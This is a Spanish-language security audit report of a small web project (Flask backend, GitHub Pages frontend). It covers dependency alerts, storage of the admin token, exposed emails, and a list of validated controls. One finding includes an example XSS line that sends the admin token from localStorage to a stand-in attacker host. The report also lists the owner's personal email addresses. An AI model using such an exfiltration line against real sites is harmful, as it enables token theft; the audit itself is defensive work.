# Security Audit — v2.4.0

**Fecha**: 2026-04-30
**Versión auditada**: `v2.4.0` (commit `623fe27`)
**Alcance**: repositorio público `rladron-rodia/landing_contacto`, backend en
Render, frontend en GitHub Pages, integraciones (Resend, Route 53)

---

## Resumen ejecutivo

| Severidad | Hallazgos | Acción |
|---|---|---|
| 🔴 Crítica | 0 | — |
| 🟠 Alta | 1 | Mergear PRs de Dependabot |
| 🟡 Media | 3 | Plan a 30 días |
| 🟢 Baja | 5 | Roadmap (nice-to-have) |
| ✅ OK | 18 controles validados | Mantener |

**Veredicto general**: el sistema está en estado **sólido** para producción. Hay
1 alerta alta que es trivial de cerrar (Dependabot ya hizo el PR), y los demás
hallazgos son hardenings adicionales no bloqueantes.

**Lo más importante**: ningún secreto está expuesto, ningún atacante puede
ejecutar código sin pasar por la cadena PR + CodeQL + 2FA + branch protection,
y todos los inputs del usuario están sanitizados antes de renderizarse o
persistirse.

---

## 1. Hallazgo 🟠 ALTO — Dependabot pendiente

### Problema

Hay **3 PRs de Dependabot abiertas** sin mergear, con CVEs conocidos en
dependencias del backend:

```
origin/dependabot/pip/server/flask-3.1.3
origin/dependabot/pip/server/flask-cors-6.0.0
origin/dependabot/pip/server/python-dotenv-1.2.2
```

GitHub reportó "6 vulnerabilities (1 high, 4 moderate, 1 low)" después del
push del cutover. Estas PRs son los fixes automáticos.

### Impacto

Hasta que se mergeen, los binarios de Flask, Flask-CORS y python-dotenv
en producción tienen vulnerabilidades públicamente conocidas. Resta riesgo
real depending del CVE específico (suelen ser ReDoS, parsing edge cases,
no RCE) pero merece atender.

### Acción recomendada (15 min)

```bash
# Ve a cada PR de Dependabot:
# https://github.com/rladron-rodia/landing_contacto/pulls
# Las 3 deben aparecer ahí abiertas.

# Para cada una:
# 1. Click en la PR
# 2. Lee el changelog que linkea Dependabot (ya viene en la descripción)
# 3. Espera CodeQL (~3 min)
# 4. Click "Merge pull request" → "Confirm"
# 5. "Delete branch"

# Tras los 3 merges, Render auto-redeploya con las versiones nuevas.
# Verifica:
curl -i https://api.monoulabs.ai/api/health
# Debe seguir 200.
```

> Si una de las PRs marca "Merging is blocked" por la regla "Require branches
> to be up to date", click "Update branch" y espera a que CodeQL re-corra.

---

## 2. Hallazgo 🟡 MEDIO — Token admin en `localStorage`

### Problema

`admin/app.js` línea 25, 42-44:

```js
const TOKEN_KEY = "monou_admin_token";
const getToken   = () => localStorage.getItem(TOKEN_KEY) || "";
const setToken   = (t) => localStorage.setItem(TOKEN_KEY, t);
```

`localStorage` persiste indefinidamente entre sesiones del browser y es
accesible desde cualquier JS que corra en el mismo origin (`monoulabs.ai`).

### Impacto

Si en algún momento se introdujera una vulnerabilidad XSS en el frontend
de `monoulabs.ai/admin/`, un atacante podría ejecutar:
```js
fetch("https://attacker.com/?t=" + localStorage.getItem("monou_admin_token"))
```
y robar el token con privilegio total sobre `/api/admin/*`.

**Estado actual del XSS**: el admin USA `escapeHtml()` consistentemente
en sus 17 `innerHTML` (78 llamadas a `escapeHtml`). No hay vector XSS
hoy. Pero el token en `localStorage` magnifica el daño de cualquier XSS
futuro (defensa en profundidad).

### Acción recomendada

**Opción A (mínima, 3 líneas)**: cambiar `localStorage` por `sessionStorage`.
Trade-off: el admin pide el token cada vez que cierra el browser.

**Opción B (mejor, ~15 líneas)**: guardar el token en variable de JS en
memoria, sin storage. El admin re-pide el token al cerrar la pestaña, pero
nada queda guardado en el browser. Inmune a XSS persistente.

**Opción C (lo correcto a largo plazo)**: convertir el admin a un flujo
de login server-side que devuelva una cookie HttpOnly + Secure +
SameSite=Strict. Requiere ~50 líneas de código backend nuevo.

Recomendación inmediata: **B** (memoria). Luego, si crece el admin,
migrar a **C**.

---

## 3. Hallazgo 🟡 MEDIO — Emails personales en historial git

### Problema

El historial público de git contiene emails personales:
- `rladron@gmail.com`
- `rodrigo.ladron@gmail.com`
- `rodrigo.ladron@monou.gg`

Aparecen en commits como autor (`Rodrigo Ladron <rladron@gmail.com>`) y
en docs/comentarios viejos.

### Impacto

- **Privacidad**: scrapers/spammers pueden capturar el email
- **Phishing**: alguien podría suplantar identidad sabiendo el email +
  el rol (owner del repo de Monou Labs)
- **Bajo riesgo de hijack**: si el atacante combina el email con una
  filtración de password de otro servicio, podría intentar entrar a
  cuentas tuyas que usen ese email

### Acción recomendada

**Mitigación a futuro**:
1. Configurar git con un email "neutral" para commits públicos:
   ```bash
   git config --global user.email "rladron@users.noreply.github.com"
   git config --global user.name "rladron-rodia"
   ```
2. GitHub provee este email "noreply" privado en `Settings → Emails →
   Keep my email addresses private`. Activar.
3. En commits FUTUROS, el email noreply de GitHub aparecerá en lugar
   del personal.

**Reescribir el historial pasado**: no recomendado. Romperia firmas,
cambiaría todos los SHAs, y el email ya está en logs de Anthropic/etc.
Eso ya pasó. Mejor enfocarse en commits futuros.

**Para tu cuenta personal**:
- Asegurarte que `rladron@gmail.com` tiene 2FA fuerte (auth app o llave)
- Recovery: tener teléfono y backup codes seguros

---

## 4. Hallazgo 🟡 MEDIO — Branches mergeadas no borradas

### Problema

6 branches en `origin/` que ya fueron mergeadas y siguen ahí:

```
origin/chore/add-pases-doc           (PR #4 mergeada)
origin/feat/custom-domain-monoulabs  (PR #5 mergeada)
origin/fix/carousel-spacing-and-footer (PR #6 mergeada)
origin/dependabot/pip/server/flask-3.1.3
origin/dependabot/pip/server/flask-cors-6.0.0
origin/dependabot/pip/server/python-dotenv-1.2.2
```

### Impacto

Bajo. No es vulnerabilidad activa, pero:
- Listas largas de branches dificultan ver el estado real
- Si alguien clona y hace `git checkout feat/...`, puede confundirse
- Si una branch tiene un commit con secret accidental que NO se mergeó,
  sigue accesible aunque el secret no llegó a `main`

### Acción recomendada

```bash
# Borrar las 3 branches de feature mergeadas
git push origin --delete chore/add-pases-doc
git push origin --delete feat/custom-domain-monoulabs
git push origin --delete fix/carousel-spacing-and-footer

# Local cleanup
git remote prune origin
git branch -d chore/add-pases-doc feat/custom-domain-monoulabs fix/carousel-spacing-and-footer 2>/dev/null
```

Las de Dependabot las borras al mergearlas (Hallazgo #1) — GitHub te
ofrece el botón "Delete branch" justo después del merge.

---

## 5. Hallazgo 🟢 BAJO — Sin Content-Security-Policy en HTML

### Problema

GitHub Pages no permite headers HTTP custom, así que no podemos servir
`Content-Security-Policy: ...` desde el frontend. Esto deja el sitio sin
una capa de defensa adicional contra XSS.

### Mitigación parcial existente

- Backend SÍ envía `X-Content-Type-Options`, `X-Frame-Options`,
  `Referrer-Policy` ✅
- Backend SÍ tiene CORS estricto ✅
- Frontend escapa todos los datos del API antes de DOM injection ✅

### Acción recomendada

Cuando muevas el frontend a Cloudflare Pages, S3+CloudFront o AWS
(según `MIGRACION-AWS.md`), agregar CSP estricto:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' https://muestra-imagen.s3.us-east-1.amazonaws.com data:;
  connect-src 'self' https://api.monoulabs.ai;
  frame-ancestors 'none';
```

No urgente — sólo cuando migres a un host que soporte custom headers.

---

## 6. Hallazgo 🟢 BAJO — Sin reCAPTCHA / hCaptcha en form

### Problema

El formulario de contacto puede ser abusado por bots. Mitigaciones
actuales: honeypot (`website` field) + rate limiting (5/min/IP).

### Acción recomendada

Cuando empieces a recibir spam, agregar reCAPTCHA v3 invisible o
hCaptcha. Implementación: ~30 líneas (script en frontend + verificación
en backend). Mientras no haya spam, no urge.

---

## 7. Hallazgo 🟢 BAJO — Sin WAF / Cloudflare delante

### Problema

Sin un WAF (Web Application Firewall) delante, el backend recibe todo
el tráfico directo de Render. Sin DDoS protection más allá de lo que
ofrece Render gratis.

### Mitigaciones actuales

- Render ya tiene Cloudflare delante (visto en `dig +short api.monoulabs.ai`
  → cdn.cloudflare.net)
- Rate limit de Flask-Limiter en `/api/contact` (5/min)
- Default limit global 200/h por IP

### Acción recomendada

Si llegas a tráfico real significativo, registrar el dominio en
Cloudflare gratis (proxy mode) — esto te da:
- WAF managed rules (gratis)
- DDoS protection L3-L7
- Cache de assets estáticos
- Analytics
- Rate limiting de borde
- Bot protection

Setup: ~10 min (cambiar nameservers de Route 53 a Cloudflare, importar
zona). Hoy no urge.

---

## 8. Hallazgo 🟢 BAJO — Sin monitoreo / alertas activas

### Problema

No hay alarmas cuando:
- Backend cae (cold start largo, OOM, crash)
- Tasa de errores aumenta
- Uso de CPU/memoria/conexiones DB se dispara
- Resend rebota emails

### Mitigación actual

- Render Dashboard tiene logs y métricas básicas (consultas manuales)
- Resend Dashboard tiene historial de envíos (consulta manual)

### Acción recomendada

Para producción seria, integrar:
- **UptimeRobot** (gratis hasta 50 monitors): ping a `/api/health` cada 5 min
- **Slack/Email alert** cuando UptimeRobot detecte caída
- **Render Health checks** ya activos (configurados en `render.yaml`)

Setup UptimeRobot: 5 min. Mientras estés solo monitoreando manualmente,
puedes posponerlo.

---

## 9. Hallazgo 🟢 BAJO — Token admin sin expiración

### Problema

`ADMIN_TOKEN` es un Bearer estático que no caduca. Si se filtra (en una
captura, log, share), funciona indefinidamente hasta que rotes
manualmente.

### Mitigación actual

- Validación timing-safe (`hmac.compare_digest`)
- Token de 256 bits (`secrets.token_urlsafe(32)`)
- Recomendación de rotación cada 90 días en `PASES.md`

### Acción recomendada

A medio plazo: convertir a JWT con expiración (1h) + refresh token.
Implementación: ~30 líneas backend + ~20 frontend. No urgente mientras
roleS la rotación periódica.

---

## ✅ Controles validados (todo OK)

### A. Repositorio público — qué se ve

| Control | Estado |
|---|---|
| `.env` nunca commiteado | ✅ Confirmado vía `git log --diff-filter=A` |
| Sin API keys reales en historial | ✅ Búsqueda de regex `re_*`, `sk_*`, `ghp_*` vacía |
| Sin `DATABASE_URL` real en historial | ✅ Solo placeholders en docs |
| Sin secretos hardcoded en frontend | ✅ Búsqueda de `api_key`, `password`, `secret`, `token` con valor literal vacía |
| `.gitignore` blinda futuros leaks | ✅ Bloquea `.env*`, `*.pem`, `*.key`, dumps SQL, claves SSH |
| 34 archivos públicos, 796 KB | ✅ Sólo código de la landing + docs + 2 fonts woff2 |

### B. Acceso al código

| Control | Estado |
|---|---|
| Branch protection en `main` | ✅ Ruleset `protect-main` activo |
| Force pushes bloqueados | ✅ |
| Deletions de `main` bloqueadas | ✅ |
| PR obligatorio | ✅ Required approvals: 0 (single dev) + Conversation resolution |
| CodeQL como required status check | ✅ Cada PR pasa por CodeQL |
| 2FA en cuenta GitHub | ✅ Activo |
| Secret scanning + Push protection | ✅ Bloquea push de tokens conocidos |
| Dependabot alerts + security updates | ✅ Activo (3 PRs detectadas — ver Hallazgo #1) |
| OAuth apps autorizadas limpias | ✅ Solo Render, Copilot Chat App, Copilot SWE Agent |
| Personal Access Tokens | ⚠️ "Conexión claude" sin uso pendiente borrar (no urgente) |
| 2FA en cuenta Render | ✅ Activo |

### C. Backend hardening

| Control | Validación |
|---|---|
| Auth admin timing-safe | ✅ `hmac.compare_digest` (línea 377 `app.py`) |
| HTML escape en email a admin | ✅ 5 campos escapados (líneas 195-199) |
| Subject sanitizado de CRLF | ✅ Anti header-injection |
| Reply-To sanitizado | ✅ Solo si pasa regex email |
| Rate limit en `/api/contact` | ✅ 5/min, 30/h, 100/día por IP |
| Rate limit global | ✅ 200/h por IP (Flask-Limiter) |
| `MAX_CONTENT_LENGTH=64KB` | ✅ Anti payload abusivo |
| Validación de longitud por campo | ✅ `_validate_contact_payload` |
| Email regex validation | ✅ `EMAIL_RE.match` |
| Honeypot field | ✅ `website` field detection |
| SQL injection protection | ✅ 25+ queries parametrizadas con `%s`/`%(name)s` |
| f-strings en SQL solo con identifiers | ✅ `cols` es hard-coded, nunca user input |
| CORS estricto | ✅ `https://monoulabs.ai`, `www.monoulabs.ai`, `rladron-rodia.github.io` |
| Security headers en respuestas | ✅ XCTO, XFO, RP en todas las respuestas |
| `Cache-Control: no-store` en admin | ✅ Endpoints `/api/admin/*` y `/api/contacts` |
| Logs sin PII del request | ✅ Solo `contact_id` + clase de error |
| Endpoints admin protegidos | ✅ Todos los `/api/admin/*` y `/api/contacts` requieren `_is_admin()` |
| Endpoints públicos sin metadata sensible | ✅ `/api/analytics-config` filtra antes de retornar |

### D. Frontend hardening

| Control | Validación |
|---|---|
| Sin `eval()` ni `Function()` dinámica | ✅ Búsqueda confirma cero ocurrencias |
| Datos del API escapados en admin | ✅ `escapeHtml()` en 78 lugares vs 17 `innerHTML` |
| Datos del API escapados en loaders públicos | ✅ Verificado en `delivery-loader`, `info-columns-loader` |
| Sin secretos en código JS público | ✅ Solo URLs de API y constantes UI |
| Honeypot frontend | ✅ Campo `website` en form |
| Validación cliente antes de submit | ✅ `data.nombre`, `data.email` checks |

### E. Workflows / CI

| Control | Validación |
|---|---|
| Sin GitHub Actions custom | ✅ No hay `.github/workflows/` propios |
| Sin trigger `pull_request_target` peligroso | ✅ N/A |
| CodeQL Default setup | ✅ Escanea Python + JS/TS en cada PR |
| Copilot Autofix activo | ✅ Sugiere fixes automáticos para alertas |

### F. Infraestructura

| Control | Validación |
|---|---|
| HTTPS forzado en Pages | ✅ "Enforce HTTPS" activo |
| Cert TLS válido en `monoulabs.ai` | ✅ Let's Encrypt vía Pages |
| Cert TLS válido en `api.monoulabs.ai` | ✅ Let's Encrypt vía Render |
| Cloudflare delante de Render (incluido) | ✅ `cdn.cloudflare.net` en CNAME chain |
| Postgres no expuesto a internet | ✅ `--no-publicly-accessible` (default Render) |
| Secrets en Render Environment | ✅ `RESEND_API_KEY` y `ADMIN_TOKEN` con `sync: false` |

---

## Plan de remediación recomendado

### Esta semana (40 min total)

1. **Mergear 3 PRs de Dependabot** — 15 min
2. **Borrar branches mergeadas** — 5 min
3. **Borrar PAT "Conexión claude"** (Settings → Tokens classic) — 1 min
4. **Configurar `noreply` email en git** — 5 min
5. **Cambiar token admin de localStorage a memoria** — 15 min (1 PR)

### Este mes

6. Verificar dominio `monoulabs.ai` en Resend para mejorar entregabilidad
7. Configurar UptimeRobot con alerta a tu email/Slack

### Cuando el proyecto crezca

8. Cloudflare delante (gratis, requiere cambiar nameservers)
9. CSP estricto cuando muevas frontend a hosting con custom headers
10. JWT con expiración para admin auth
11. reCAPTCHA si llega spam real

---

## Atestaciones

A esta fecha, **2026-04-30**, sobre `v2.4.0`:

✅ **No hay información sensible expuesta** públicamente. El historial git
está limpio de secretos reales. El frontend público no incluye API keys,
tokens, ni credenciales.

✅ **Nadie puede ejecutar actualizaciones desde el código** sin pasar por:
2FA en GitHub → autenticarse como `rladron-rodia` → crear branch → abrir
PR → CodeQL pasa sin alertas → mergear con la regla `protect-main` activa.
Cualquier `push --force` o push directo a `main` es bloqueado.

✅ **El código fuente de ejecución no es accesible** para terceros más
allá de la respuesta HTTP del backend. La DB no es alcanzable desde
internet (subnet privada Render). Los logs están en panel autenticado
de Render. Los secretos viven en Render Environment con flag `sync: false`.

⚠️ **El código fuente estático ES público** porque el repo está en modo
público. Si esto NO es deseado, considerar cambiar a privado en
`Settings → General → Danger Zone → Change visibility`. Hoy es público
por elección (portfolio / colaboración).

🟠 **Vulnerabilidades pendientes**: 3 alertas de Dependabot (1 high, 2 lower)
en dependencias del backend. Trivial de cerrar mergeando las PRs ya
abiertas.

---

## Referencias

- v2.3.0: hardenings de seguridad iniciales (anclaje rollback)
- v2.4.0: cutover a custom domain (versión actual)
- `PASES.md`: flujo de despliegue post-rollout
- `ROLLBACK.md`: procedimientos de reversión
- `MIGRACION-AWS.md`: plan de migración futura

---

**Autor**: Auditoría asistida por IA, validada con búsquedas automatizadas
sobre el código y el historial git.
**Última actualización**: 2026-04-30
